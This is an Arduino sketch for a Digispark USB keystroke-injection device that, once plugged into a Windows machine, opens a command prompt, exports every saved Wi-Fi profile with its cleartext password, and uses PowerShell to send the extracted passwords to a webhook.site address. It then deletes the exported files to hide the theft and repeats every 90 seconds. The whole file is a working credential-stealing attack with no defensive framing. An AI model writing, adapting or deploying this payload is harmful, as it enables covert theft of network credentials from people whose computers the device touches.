#include "DigiKeyboard.h"

// Define custom functions for better code organization
void runCommand(const char* command, int delayAfter = 1000) {
  DigiKeyboard.println(command);
  DigiKeyboard.delay(delayAfter);
}

void setup() {
  DigiKeyboard.delay(2000);  // Give some time for the computer to initialize
  pinMode(1, OUTPUT);
}

void loop() {
  // Update the DigiKeyboard to allow sending keystrokes
  DigiKeyboard.update();

  // Wait for the system to be ready before executing commands
  DigiKeyboard.delay(5000);

  // Open the Run dialog (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);

  // Type the initial commands using DuckyScript
  runCommand("cmd");
  runCommand("cd %temp%");
  runCommand("netsh wlan export profile key=clear");
  runCommand("powershell Select-String -Path Wi-Fi-* -Pattern 'keyMaterial' > Wi-Fi-PASS");
  runCommand("powershell Invoke-WebRequest -Uri https://webhook.site/51edb4dc-a5c8-479f-8ed2-2f6bfd8fcef9 -Method POST -InFile Wi-Fi-PASS");
  runCommand("del Wi-Fi-* /s /f /q");
  runCommand("exit", 100);

  // Blink the LED (Pin 1) to indicate the completion of the process
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(3000); // Keep the LED on for 3 seconds
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);

  // Add a timeout to avoid constant repeating of the process
  DigiKeyboard.delay(90000); // Wait 90 seconds before repeating
}
